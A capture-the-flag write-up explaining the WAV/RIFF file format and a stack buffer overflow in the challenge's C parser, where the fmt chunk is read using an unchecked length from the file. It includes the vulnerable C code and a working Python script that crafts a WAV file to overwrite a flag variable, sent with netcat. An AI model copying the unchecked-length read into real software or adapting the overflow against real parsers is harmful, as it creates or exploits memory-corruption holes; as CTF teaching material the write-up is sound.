# flood writeup

> I've started growing my own WAV file parser. Sadly, it's not getting far, and
> the soil seems to be really dry. Can you flood it to help me?

In this challenge, we are presented with a web interface to upload WAV files,
which then get parsed by some C code, given to the participant. (As an
alternative to using a web interface, a raw TCP connection using `telnet` or
`netcat` can be used as well.)

Before we look at the specifics of this challenge, let's first review how WAV
files work internally (cf. e.g.
[here](https://www.mmsp.ece.mcgill.ca/Documents/AudioFormats/WAVE/WAVE.html),
note that everything in WAV files is little-endian):

A WAV file starts with a RIFF header, which is four magic bytes (`RIFF`)
followed by a 4-byte value denoting the number of bytes the rest of the file
consists of. This RIFF header is then followed by four more magic bytes, `WAVE`.

The rest of the file consists of various RIFF *chunks*, each starting with
four magic bytes, followed by a 4-byte size. Chunks are used to contain the
audio data itself, as well as metadata (both about how to decode this audio
data, and things like music metadata like the title of the track and who
composed it). The `data` chunk contains the actual audio data, while the `fmt `
chunk stores the metadata necessary for decoding, such as the number of audio
channels (mono, stereo, or more) and the sample rate.

Alright, with that out of the way, let's have a look at the code of the
challenge.

```c
struct riff_header {
	uint32_t magic;
	uint32_t size;
};

enum wavefmt_types { /* snip */ };

struct wavefmt {
	uint16_t fmt; // see enum above
	uint16_t channels; // 1 or 2
	uint32_t samplerate;
	uint32_t datarate; // bytes per second; sample rate * channels * bit depth / 8
	uint16_t blockalign;
	uint16_t bitdepth;
};

int main(int argc, char** argv) {
	volatile int print_flag = 0;
	struct wavefmt fmt;
	struct riff_header hdr;
	uint32_t totalsize;
	void* data;

	memset(&fmt, 0, sizeof(fmt));

	fread(&hdr, sizeof(hdr), 1, stdin);
	check(stdin);
	if (hdr.magic != RIFF_MAGIC) error("Bad RIFF header magic!\n");
	if (hdr.size < 4) error("Invalid RIFF header!\n");
	totalsize = hdr.size;

	fread(&hdr.magic, sizeof(uint32_t), 1, stdin);
	check(stdin);
	if (hdr.magic != WAVE_MAGIC) error("Bad WAVE header magic!\n");
	totalsize -= 4;

	while (totalsize > 8) {
		fread(&hdr, sizeof(hdr), 1, stdin);
		check(stdin);
		totalsize -= sizeof(hdr) + hdr.size;

		if (hdr.magic == Wfmt_MAGIC) {
			fread(&fmt, hdr.size, 1, stdin);
			check(stdin);
		} else if (hdr.magic == Wdata_MAGIC) {
			if (fmt.fmt == 0) error("data chunk comes before the fmt chunk!\n");

			data = calloc(hdr.size, 1);
			if (data == NULL) error("Out of memory.\n");

			fread(data, 1, hdr.size, stdin);
			check(stdin);
		} else if (fseek(stdin, hdr.size, SEEK_CUR))
			error("Seek failed: %s\n", strerror(errno));
	}

	if (print_flag) print_the_flag();

	free(data);
	return 0;
}
```

This code simply checks the header, then looks for the `fmt ` and `data`
chunks, while ignoring everything else. However, there's something to note
here: the local variable `fmt` is allocated on the stack (with type `struct
wavefmt`), while it is read from the file using the following line of code:

```c
fread(&fmt, hdr.size, 1, stdin);
```

In other words, the code will use the length *from the file*, without any
checks on how small or large this length is. This means we can write *more*
than the size of `struct wavefmt` (which is 16 bytes). But what effects will
this have?

Well, it will start overwriting other local variables on the stack. This
includes the `print_flag` variable. If we can overwrite it to become anything
nonzero, the code will give us the flag!

Now, how can we make a WAV file that does this for us? Well, luckily, this
isn't too difficult in Python:

```python
from struct import pack

EXTRABYTES = 4
DATABYTES = int((44100*2*16//8) / 1000)  # 1 millisecond of audio data

with open('hax.wav', 'wb') as f:
    # RIFF header
    f.write(b"RIFF")
    f.write(pack('<I', EXTRABYTES+16+8+8+4))
    # magic WAVE bytes
    f.write(b"WAVE")

    # fmt chunk
    f.write(b"fmt ")
    f.write(pack('<I', EXTRABYTES+16))
    f.write(pack('<HHIIHH', 1, 2, 44100, 44100*2*16, 1, 16))  # whatever
    # !!! data that gets written to print_flag due to the buffer overflow !!!
    f.write(b"A" * EXTRABYTES)  # this can be anything, as long as it's not zero

    # data chunk
    f.write(b"data")
    f.write(pack('<I', DATABYTES))
    f.write(bytearray(DATABYTES))  # bytearray(N) returns an array of N all-zero bytes
```

Uploading the (base64 representation of) the generated WAV file gives us the
flag, hooray! (Or, using `< hax.wav nc $remoteip 23` works, too.)

